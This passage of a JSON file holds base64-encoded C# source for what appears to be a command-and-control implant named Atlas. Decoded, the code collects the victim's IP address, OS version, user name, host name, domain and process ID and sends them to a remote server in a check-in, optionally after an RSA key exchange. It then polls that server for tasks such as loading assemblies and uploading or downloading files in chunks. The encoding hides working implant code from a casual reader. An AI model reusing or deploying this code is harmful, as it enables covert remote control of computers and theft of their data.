ZiAocGFyc2VMaXN0LkNvdW50ICE9IDYpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFVwbG9hZFJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IEludDMyLlBhcnNlKHBhcnNlTGlzdFsxXSksDQogICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IEludDMyLlBhcnNlKHBhcnNlTGlzdFsyXSksDQogICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBwYXJzZUxpc3RbM10sDQogICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBwYXJzZUxpc3RbNF0sDQogICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbNV0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIERvd25sb2FkUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIERvd25sb2FkUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJmaWxlX2lkIiI6ICIiezF9IiIsICIidGFza19pZCIiOiAiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCBAInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBEb3dubG9hZFJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBEb3dubG9hZFJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIERvd25sb2FkUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSA1KSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBEb3dubG9hZFJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEdldFN0YWdlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcHViX2tleSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25faWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIicHViX2tleSIiOiIiezF9IiIsIiJzZXNzaW9uX2lkIiI6IiJ7Mn0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKEdldFN0YWdlIGdldF9zdGFnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgZ2V0X3N0YWdlLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLnB1Yl9rZXkpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF9zdGFnZS5zZXNzaW9uX2lkKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgU3RhZ2VSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHV1aWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzZXNzaW9uX2tleSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25faWQgeyBnZXQ7IHNldDsgfQ0KDQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJ1dWlkIiI6ICIiezB9IiIsICIic2Vzc2lvbl9rZXkiIjogIiJ7MX0iIiwgIiJhY3Rpb24iIjogIiJ7Mn0iIiwgIiJzZXNzaW9uX2lkIiI6ICIiezN9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInszfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7M30iLCAiKD8nZ3JvdXAzJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFN0YWdlUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFN0YWdlUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgSnNvbkZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDQpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFN0YWdlUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFsyXSwNCiAgICAgICAgICAgICAgICAgICAgdXVpZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9rZXkgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb25faWQgPSBwYXJzZUxpc3RbM10NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"},{"Http_4.0.cs":"77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KI2lmIERFRkFVTFQNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KI2VuZGlmDQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBNaWNyb3NvZnQuV2luMzI7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBIdHRwDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgQ2hlY2tJbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgICAgICAgICAgQ3J5cHRvLkdlblJzYUtleXMoKTsNCiAgICAgICAgICAgICAgICBVdGlscy5HZXRTdGFnZSBHZXRTdGFnZSA9IG5ldyBVdGlscy5HZXRTdGFnZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInN0YWdpbmdfcnNhIiwNCiAgICAgICAgICAgICAgICAgICAgcHViX2tleSA9IENyeXB0by5HZXRQdWJLZXkoKSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IFV0aWxzLkdldFNlc3Npb25JZCgpDQoNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXNzaW9uSWQgPSBHZXRTdGFnZS5zZXNzaW9uX2lkOw0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0U3RhZ2UoVXRpbHMuR2V0U3RhZ2UuVG9Kc29uKEdldFN0YWdlKSk7DQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQogICAgICAgICAgICAgICAgVXRpbHMuU3RhZ2VSZXNwb25zZSBTdGFnZVJlc3BvbnNlID0gVXRpbHMuU3RhZ2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQpOw0KICAgICAgICAgICAgICAgIENvbmZpZy50ZW1wVVVJRCA9IFN0YWdlUmVzcG9uc2UudXVpZDsNCiAgICAgICAgICAgICAgICBDb25maWcuUHNrID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhDcnlwdG8uUnNhRGVjcnlwdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoU3RhZ2VSZXNwb25zZS5zZXNzaW9uX2tleSkpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW4gQ2hlY2tJbiA9IG5ldyBVdGlscy5DaGVja0luDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiY2hlY2tpbiIsDQogICAgICAgICAgICAgICAgICAgIGlwID0gVXRpbHMuR2V0SVBBZGRyZXNzKCksDQogICAgICAgICAgICAgICAgICAgIG9zID0gUmVnaXN0cnkuR2V0VmFsdWUoQCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iLCAiUHJvZHVjdE5hbWUiLCAiIikuVG9TdHJpbmcoKSArICIgIiArIFJlZ2lzdHJ5LkdldFZhbHVlKEAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIiwgIlJlbGVhc2VJZCIsICIiKSwNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IEVudmlyb25tZW50LlVzZXJOYW1lLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBFbnZpcm9ubWVudC5NYWNoaW5lTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBFbnZpcm9ubWVudC5Vc2VyRG9tYWluTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBwaWQgPSBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBDb25maWcuUGF5bG9hZFVVSUQsDQogICAgICAgICAgICAgICAgICAgIGFyY2hpdGVjdHVyZSA9IFV0aWxzLkdldEFyY2goKQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBGaW5hbFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5QYXlsb2FkVVVJRCArIFV0aWxzLkNoZWNrSW4uVG9Kc29uKENoZWNrSW4pKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIEZpbmFsU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdENoZWNraW4oVXRpbHMuQ2hlY2tJbi5Ub0pzb24oQ2hlY2tJbikpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIG5ld19yZXN1bHQgPSBHZXQoRmluYWxTZXJpYWxpemVkRGF0YSk7DQojaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBsYXN0X3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KG5ld19yZXN1bHQpOw0KI2VuZGlmDQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW5SZXNwb25zZSBDaGVja0luUmVzcG9uc2UgPSBVdGlscy5DaGVja0luUmVzcG9uc2UuRnJvbUpzb24obmV3X3Jlc3VsdCk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgVXRpbHMuQ2hlY2tJblJlc3BvbnNlIENoZWNrSW5SZXNwb25zZSA9IFV0aWxzLkNoZWNrSW5SZXNwb25zZS5Gcm9tSnNvbihsYXN0X3Jlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBDb25maWcuVVVJRCA9IENoZWNrSW5SZXNwb25zZS5pZDsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2tJblJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEdldFRhc2tpbmcoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5Kb2IgSm9iIGluIEpvYkxpc3Quam9icykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IudXBsb2FkKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRvdGFsX2NodW5rcyAhPSBKb2IuY2h1bmtfbnVtKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghSm9iLmNodW5raW5nX3N0YXJ0ZWQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRUYXNraW5nIFVwbG9hZFRhc2tpbmcgPSBVdGlscy5VcGxvYWRUYXNraW5nLkZyb21Kc29uKEpvYi5wYXJhbWV0ZXJzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmZpbGVfaWQgPSBVcGxvYWRUYXNraW5nLmFzc2VtYmx5X2lkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucGF0aCA9IFVwbG9hZFRhc2tpbmcucmVtb3RlX3BhdGg7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZCBVcGxvYWQgPSBuZXcgVXRpbHMuVXBsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9ICJ1cGxvYWQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfc2l6ZSA9IENvbmZpZy5DaHVua1NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBIdHRwLkdldFVwbG9hZChVcGxvYWQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gVXBsb2FkUmVzcG9uc2UudG90YWxfY2h1bmtzOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLkFkZChVcGxvYWRSZXNwb25zZS5jaHVua19kYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5raW5nX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtfbnVtKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZCBDaHVua1VwbG9hZCA9IG5ldyBVdGlscy5VcGxvYWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInVwbG9hZCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19zaXplID0gQ29uZmlnLkNodW5rU2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBKb2IuZmlsZV9pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IEpvYi5jaHVua19udW0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBKb2IucGF0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IEh0dHAuR2V0VXBsb2FkKENodW5rVXBsb2FkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQoVXBsb2FkUmVzcG9uc2UuY2h1bmtfZGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFV0aWxzLkdldFRhc2tpbmcgR2V0VGFza2luZyA9IG5ldyBVdGlscy5HZXRUYXNraW5nDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiZ2V0X3Rhc2tpbmciLA0KICAgICAgICAgICAgICAgICAgICB0YXNraW5nX3NpemUgPSAzDQogICAgICAgICAgICAgICAgfTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5VVUlEICsgVXRpbHMuR2V0VGFza2luZy5Ub0pzb24oR2V0VGFza2luZykpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5HZXRUYXNraW5nLlRvSnNvbihHZXRUYXNraW5nKSk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gR2V0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIGlmIChmaW5hbF9yZXN1bHQuU3Vic3RyaW5nKDAsIDM2KSAhPSBDb25maWcuVVVJRCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgVXRpbHMuR2V0VGFza2luZ1Jlc3BvbnNlIEdldFRhc2tSZXNwb25zZSA9IFV0aWxzLkdldFRhc2tpbmdSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQuU3Vic3RyaW5nKDM2KSk7DQogICAgICAgICAgICAgICAgaWYgKEdldFRhc2tSZXNwb25zZS50YXNrc1swXS5jb21tYW5kID09ICIiKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5UYXNrIHRhc2sgaW4gR2V0VGFza1Jlc3BvbnNlLnRhc2tzKSB7DQogICAgICAgICAgICAgICAgICAgIFV0aWxzLkpvYiBKb2IgPSBuZXcgVXRpbHMuSm9iDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYl9pZCA9IEpvYkxpc3Quam9iX2NvdW50LA0KICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHRhc2suaWQsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYl9zdGFydGVkID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBzdWNjZXNzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGFzay5jb21tYW5kLA0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHRhc2sucGFyYW1ldGVycywNCiAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IDANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jb21tYW5kID09ICJsb2FkYXNzZW1ibHkiIHx8IEpvYi5jb21tYW5kID09ICJ1cGxvYWQiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IudXBsb2FkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50b3RhbF9jaHVua3MgPSAyOw0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSA9IDE7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNvbW1hbmQgPT0gImRvd25sb2FkIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgSm9i